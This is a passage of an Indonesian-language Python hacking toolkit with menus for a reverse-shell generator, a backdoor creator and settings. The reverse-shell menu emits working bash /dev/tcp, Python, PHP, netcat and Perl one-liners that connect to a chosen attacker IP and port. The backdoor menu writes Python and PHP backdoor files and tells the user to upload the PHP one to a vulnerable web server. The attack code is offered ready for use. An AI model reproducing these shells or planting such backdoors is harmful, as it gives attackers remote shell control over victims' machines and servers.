    lport = input(f"{Fore.YELLOW}[?] Masukkan LPORT: {Style.RESET_ALL}")
    
    if not lhost or not lport:
        print(f"{Fore.RED}[-] LHOST dan LPORT harus diisi!{Style.RESET_ALL}")
        return
    
    shells = {
        "1": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "2": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "3": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "4": f"nc -e /bin/sh {lhost} {lport}",
        "5": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    }
    
    if choice in shells:
        print(f"\n{Fore.GREEN}[+] Reverse shell code:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{shells[choice]}{Style.RESET_ALL}")
        
        save = input(f"{Fore.YELLOW}[?] Simpan ke file? (y/n): {Style.RESET_ALL}").lower()
        if save == 'y':
            filename = input(f"{Fore.YELLOW}[?] Masukkan nama file: {Style.RESET_ALL}")
            with open(filename, 'w') as f:
                f.write(shells[choice])
            print(f"{Fore.GREEN}[+] Berhasil disimpan ke {filename}{Style.RESET_ALL}")
        
        log_action("Membuat reverse shell", f"tipe: {choice}, lhost: {lhost}, lport: {lport}")
    else:
        print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk Backdoor Creator
def backdoor_creator():
    print(f"\n{Fore.BLUE}=== BACKDOOR CREATOR ==={Style.RESET_ALL}")
    print("1. Python Backdoor")
    print("2. PHP Backdoor")
    print("3. Kembali ke menu Remote Access")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih jenis backdoor (1-3): {Style.RESET_ALL}")
    
    if choice == "3":
        return
    
    lhost = input(f"{Fore.YELLOW}[?] Masukkan LHOST (IP attacker): {Style.RESET_ALL}")
    lport = input(f"{Fore.YELLOW}[?] Masukkan LPORT: {Style.RESET_ALL}")
    
    if not lhost or not lport:
        print(f"{Fore.RED}[-] LHOST dan LPORT harus diisi!{Style.RESET_ALL}")
        return
    
    backdoors = {
        "1": f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])""",
        "2": f"""<?php
$sock=fsockopen("{lhost}",{lport});
exec("/bin/sh -i <&3 >&3 2>&3");
?>"""
    }
    
    if choice in backdoors:
        print(f"\n{Fore.GREEN}[+] Backdoor code:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{backdoors[choice]}{Style.RESET_ALL}")
        
        save = input(f"{Fore.YELLOW}[?] Simpan ke file? (y/n): {Style.RESET_ALL}").lower()
        if save == 'y':
            filename = input(f"{Fore.YELLOW}[?] Masukkan nama file: {Style.RESET_ALL}")
            with open(filename, 'w') as f:
                f.write(backdoors[choice])
            print(f"{Fore.GREEN}[+] Berhasil disimpan ke {filename}{Style.RESET_ALL}")
            
            if choice == "1":
                print(f"{Fore.YELLOW}[!] Jalankan dengan: python {filename}{Style.RESET_ALL}")
            elif choice == "2":
                print(f"{Fore.YELLOW}[!] Upload ke server web yang rentan{Style.RESET_ALL}")
        
        log_action("Membuat backdoor", f"tipe: {choice}, lhost: {lhost}, lport: {lport}")
    else:
        print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk menu Pengaturan
def settings_menu():
    while True:
        print(f"\n{Fore.BLUE}=== PENGATURAN ==={Style.RESET_ALL}")
        print("1. Ganti Bahasa (English/Indonesia)")
        print("2. Mode Pemula/Ahli")
        print("3. Cek Update")
        print("4. Cek Dependensi")
        print("5. Kembali ke Menu Utama")
        
        choice = input(f"{Fore.YELLOW}[?] Pilih opsi (1-5): {Style.RESET_ALL}")
        
        if choice == "1":
            change_language()
        elif choice == "2":
            change_expert_mode()
        elif choice == "3":
            update_tools()
        elif choice == "4":
            check_dependencies_menu()
        elif choice == "5":
            break
        else:
            print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk mengganti bahasa
def change_language():
    global LANGUAGE
    
    print(f"\n{Fore.BLUE}=== GANTI BAHASA ==={Style.RESET_ALL}")
    print("1. English")
    print("2. Indonesia")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih bahasa (1-2): {Style.RESET_ALL}")
    
    if choice == "1":
        LANGUAGE = "en"
        print(f"{Fore.GREEN}[+] Bahasa diubah ke English{Style.RESET_ALL}")
    elif choice == "2":
        LANGUAGE = "id"
        print(f"{Fore.GREEN}[+] Bahasa diubah ke Indonesia{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk mengubah mode pemula/ahli
def change_expert_mode():
    print(f"\n{Fore.BLUE}=== MODE PENGGUNA ==={Style.RESET_ALL}")
    print("1. Mode Pemula (Fitur dasar saja)")
    print("2. Mode Ahli (Semua fitur)")
    
    choice = input(f"{Fore.YELLOW}[?] Pilih mode (1-2): {Style.RESET_ALL}")
    
    if choice in ["1", "2"]:
        print(f"{Fore.GREEN}[+] Mode berhasil diubah{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Pilihan tidak valid!{Style.RESET_ALL}")

# Fungsi untuk mengecek dependensi
def check_dependencies_menu():
    missing = check_dependencies()
    
    if missing:
        print(f"\n{Fore.RED}[-] Dependensi yang tidak terinstall:{Style.RESET_ALL}")
        for tool in missing:
            print(f"- {tool}")
        
        print(f"\n{Fore.YELLOW}[!] Beberapa fitur mungkin tidak berfungsi tanpa dependensi ini{Style.RESET_ALL}")
        
        if confirm_action("Coba install dependensi yang hilang?"):
            install_missing_dependencies(missing)
    else:
        print(f"\n{Fore.GREEN}[+] Semua dependensi utama terinstall!{Style.RESET_ALL}")

# Fungsi untuk menginstall dependensi yang hilang
def install_missing_dependencies(missing_tools):
    system = platform.system().lower()
    
    if system == "linux":
        if confirm_action("Gunakan apt-get untuk install? (Debian/Ubuntu)"):
            for tool in missing_tools:
                try:
                    print(f"{Fore.CYAN}[*] Menginstall {tool}...{Style.RESET_ALL}")
                    subprocess.run(f"sudo apt-get install -y {tool}", shell=True, check=True)
                    print(f"{Fore.GREEN}[+] {tool} berhasil diinstall{Style.RESET_ALL}")
                except subprocess.CalledProcessError as e:
                    print(f"{Fore.RED}[-] Gagal menginstall {tool}: {str(e)}{Style.RESET_ALL}")
    elif system == "windows":
        print(f"{Fore.YELLOW}[!] Silahkan install manual dependensi berikut:{Style.RESET_ALL}")
        for tool in missing_tools:
            print(f"- {tool}")
    else:
        print(f"{Fore.YELLOW}[!] Sistem operasi tidak dikenali, silahkan install manual{Style.RESET_ALL}")

# Fungsi utama
def main():
    # Tampilkan banner
    show_banner()
    
    # Tampilkan disclaimer
    show_disclaimer()
    
    # Periksa dependensi
    missing_deps = check_dependencies()
    if missing_deps:
        print(f"{Fore.YELLOW}[!] Beberapa dependensi tidak terinstall:{Style.RESET_ALL}")
        for dep in missing_deps:
            print(f"- {dep}")
        print(f"{Fore.YELLOW}[!] Beberapa fitur mungkin tidak berfungsi{Style.RESET_ALL}")
    
    # Periksa koneksi internet
    if check_internet():
        print(f"{Fore.GREEN}[+] Terhubung ke internet{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[!] Tidak terhubung ke internet, beberapa fitur mungkin terbatas{Style.RESET_ALL}")
    
    # Tampilkan menu utama
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Program dihentikan oleh pengguna{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
